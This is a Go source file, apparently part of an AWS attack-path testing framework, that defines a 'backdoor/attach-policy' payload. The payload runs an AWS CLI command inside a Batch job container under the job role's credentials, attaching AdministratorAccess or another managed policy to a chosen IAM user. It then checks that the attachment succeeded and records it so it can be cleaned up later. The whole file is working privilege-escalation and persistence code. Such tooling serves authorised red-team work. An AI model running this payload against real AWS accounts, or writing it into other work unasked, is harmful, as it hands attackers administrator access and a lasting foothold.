package batch

import (
	"context"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates a bash command that attaches a managed policy
// to an IAM user. The command runs inside the Batch job container, which executes
// with the jobRoleArn's credentials from the pre-existing job definition.
//
// Modules pass this command to ContainerOverrides.Command via ["sh", "-c", code] so
// the shell evaluates the full AWS CLI invocation.
type BackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess (or any managed policy) to an IAM user via Batch job container command"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceBatch,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_USER",
			Description: "IAM username to attach the policy to (auto-resolved from caller identity if not set)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Managed policy ARN to attach",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_USER"] == "" {
		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode returns the AWS CLI subcommand args (without the "aws" prefix) for use
// as ContainerOverrides.Command. The batch job container's entrypoint is "aws", so the
// module splits these args directly into []string — no "sh -c" wrapper needed or wanted.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	return fmt.Sprintf("iam attach-user-policy --user-name %s --policy-arn %s", targetUser, policyArn), nil
}

// VerifySuccess confirms the policy attachment by listing the user's attached policies.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	if targetUser == "" {
		return false, fmt.Errorf("TARGET_USER not set; cannot verify")
	}

	iamClient := iam.NewFromConfig(config)
	result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
		UserName: aws.String(targetUser),
	})
	if err != nil {
		return false, nil
	}

	for _, policy := range result.AttachedPolicies {
		if aws.ToString(policy.PolicyArn) == policyArn {
			return true, nil
		}
	}

	return false, nil
}

// ReportSideEffects returns the policy attachment as a tracked resource so workspace
// cleanup can later detach it.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", targetUser, policyName),
			ARN:           policyArn,
			CleanupMethod: "iam:DetachUserPolicy",
			Metadata: map[string]string{
				"principal_type": "user",
				"principal_name": targetUser,
				"policy_arn":     policyArn,
			},
		},
	}
}

// ProcessResult returns a formatted summary of the batch job execution result.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
